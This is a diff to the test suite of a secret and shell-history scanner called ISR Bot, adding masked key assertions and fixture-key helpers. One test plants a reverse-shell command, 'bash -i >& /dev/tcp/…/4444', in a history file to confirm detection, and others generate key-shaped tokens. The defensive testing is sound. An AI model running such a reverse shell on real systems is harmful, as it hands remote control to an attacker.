@@ -47,11 +47,51 @@ def fake_scanner(name, body):
     return p
 
 
-def fake_key(n, alphabet="ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789", seed=7):
-    """Realistic-looking random key, built at test time so no key-shaped string is committed."""
+FAKE_KEY_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"
+
+
+def fake_key(n, alphabet=FAKE_KEY_ALPHABET, seed=7):
+    """A key body built at test time, so no key-shaped string is committed. 1.1.1: in the default alphabet it is an ISR Bot fixture
+    body (isr.fixture_body, its MAC made for ghp_): "ghp_" + fake_key(36) is a fixture every audit leaves out; after any other
+    prefix it is a marked look-alike that still alerts. A custom alphabet (hex, AWS-style /+) gives a random body, as before: not a
+    fixture. Either way a test never echoes one (assert_has_key / assert_lacks_key)."""
+    if alphabet == FAKE_KEY_ALPHABET and n >= 8:
+        return isr.fixture_body("ghp_", n, seed=seed + n)
     import random
     r = random.Random(seed + n)
     return "".join(r.choice(alphabet) for _ in range(n))
+
+
+def not_a_fixture(prefix, n, seed=0):
+    """A key-shaped value that is not an ISR Bot fixture: isr.make_isr_fixture's with its last character changed (a wrong MAC),
+    for a test whose point is that a real-format key still alerts. Every audit flags it, so it is never echoed."""
+    v = isr.make_isr_fixture(prefix, n, seed)
+    alphabet = isr._fix_alphabet(prefix)
+    v = v[:-1] + alphabet[(alphabet.index(v[-1]) + 1) % len(alphabet)]
+    assert not isr.is_isr_fixture(v)
+    return v
+
+
+def _redacted(value):
+    """How a failure message names a planted value: masked (isr.mask), with its length; never the value."""
+    return f"{isr.mask(value)} ({len(value)} characters)"
+
+
+def _as_text(text):
+    return text.decode("utf-8", "replace") if isinstance(text, (bytes, bytearray)) else str(text)
+
+
+def assert_has_key(test, text, value, msg=""):
+    """1.1.1: `value` (a planted key) is in `text` (str or bytes). On failure only a masked form is said, never the value or the
+    text (which may hold other keys): the Nov 5 replay logs were assertIn's echo of a planted key."""
+    if value not in _as_text(text):
+        test.fail(f"the planted key {_redacted(value)} is not in the text ({len(text)} characters)" + (f": {msg}" if msg else ""))
+
+
+def assert_lacks_key(test, text, value, msg=""):
+    """1.1.1: `value` (a planted key) is not in `text`; on failure only a masked form is said (assert_has_key)."""
+    if value in _as_text(text):
+        test.fail(f"the planted key {_redacted(value)} is still in the text ({len(text)} characters)" + (f": {msg}" if msg else ""))
 
 
 def vet(path):
@@ -93,7 +133,7 @@ class Vet(unittest.TestCase):
             _, r = vet(f.name)
             hits = [x for x in r["findings"] if x["rule"] == "ISR-T011"]
             self.assertTrue(hits)
-            self.assertNotIn(key, json.dumps(r))
+            assert_lacks_key(self, json.dumps(r), key)
         finally:
             os.unlink(f.name)
 
@@ -127,8 +167,9 @@ class FalsePositives(unittest.TestCase):
         self.assertNotIn("ISR-T011", {f["rule"] for f in isr.scan_text(t, "voices.json", self.rules)})
 
     def test_real_key_shapes_still_caught(self):
+        # 1.1.1: fake_key's bodies carry a MAC made for ghp_, so after these prefixes they are look-alikes, never fixtures
         for k in ("sk-ant-api03-" + fake_key(40), "sk-proj-" + fake_key(36), "sk-" + fake_key(48)):
-            self.assertIn("ISR-T011", {f["rule"] for f in isr.scan_text(f"key={k}", "x", self.rules)}, k)
+            self.assertIn("ISR-T011", {f["rule"] for f in isr.scan_text(f"key={k}", "x", self.rules)}, _redacted(k))
 
     def test_browser_cache_dirs_skipped(self):
         d = tempfile.mkdtemp()
@@ -352,13 +393,13 @@ class Flow(unittest.TestCase):
         delta = json.loads(self.call("daily", "--roots", self.root, "--exports", self.exports))
         rules = {f["rule"] for f in delta["new"]}
         self.assertTrue({"ISR-I001", "ISR-T005", "ISR-T008"} <= rules, rules)
-        # secret dropped in workspace
+        # secret dropped in workspace (1.1.1: a real-format key, not a fixture: an ISR Bot fixture is no finding)
         with open(os.path.join(self.root, "notes.txt"), "w") as f:
-            self.key = "ghp_" + fake_key(36)
+            self.key = not_a_fixture("ghp_", 36, seed=397)
             f.write("token " + self.key + "\n")
         delta = json.loads(self.call("daily", "--roots", self.root, "--exports", self.exports))
         self.assertIn("ISR-S001", {f["rule"] for f in delta["new"]})
-        self.assertNotIn(self.key, json.dumps(delta))
+        assert_lacks_key(self, json.dumps(delta), self.key)
         rep = self.call("report")
         self.assertIn("ISR Bot report", rep)
         rdir = os.path.join(os.environ["ISR_BOT_HOME"], "reports")
@@ -438,7 +479,7 @@ class Features(unittest.TestCase):
         self.assertIn("ISR-H005", rules)
         self.assertIn("ISR-H006", rules)
         self.assertEqual(rules.count("ISR-H001"), 1)          # known installer ignored
-        self.assertNotIn(key, json.dumps(fs))
+        assert_lacks_key(self, json.dumps(fs), key)
         self.assertEqual(isr.history_findings(self.rules), [])  # only new lines next time
         open(h, "a").write("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1\n")
         self.assertEqual([f["rule"] for f in isr.history_findings(self.rules)], ["ISR-H003"])
@@ -536,7 +577,7 @@ class Features(unittest.TestCase):
         self.assertEqual({x["action"] for x in r["safe_fixes"]}, {"empty_tool_cache"})
         self.assertEqual([(t["path"], t["files"], t["with_keys"]) for t in r["old_transcripts_for_you_to_delete_in_the_app"]], [(tr, 1, 1)])
         self.assertTrue(os.path.exists(os.path.join(tc, "1.txt")))      # preview changes nothing
-        self.assertNotIn(key, o)
+        assert_lacks_key(self, o, key)
         code, o = self.out("fix", "--apply", "--roots", *roots)
         self.assertTrue(os.path.exists(os.path.join(tc, "1.txt")))       # --apply alone is not the owner's yes
         code, o = self.out("fix", "--apply", "--owner-said-yes", "--roots", *roots)
@@ -594,8 +635,8 @@ class Features(unittest.TestCase):
         self.assertEqual(targets, [os.path.join(sess, "s1.json")])                 # chat log yes, code no
         self.out("fix", "--roots", self.tmp)                                       # the list the owner says yes to
         code, o = self.out("fix", "--apply", "--owner-said-yes", "--roots", self.tmp)
-        self.assertNotIn(key, open(os.path.join(sess, "s1.json")).read())
-        self.assertIn(key, open(os.path.join(code_dir, "settings.py")).read())
+        assert_lacks_key(self, open(os.path.join(sess, "s1.json")).read(), key)
+        assert_has_key(self, open(os.path.join(code_dir, "settings.py")).read(), key)
 
     def test_score_moves_gently(self):
         F = isr.finding
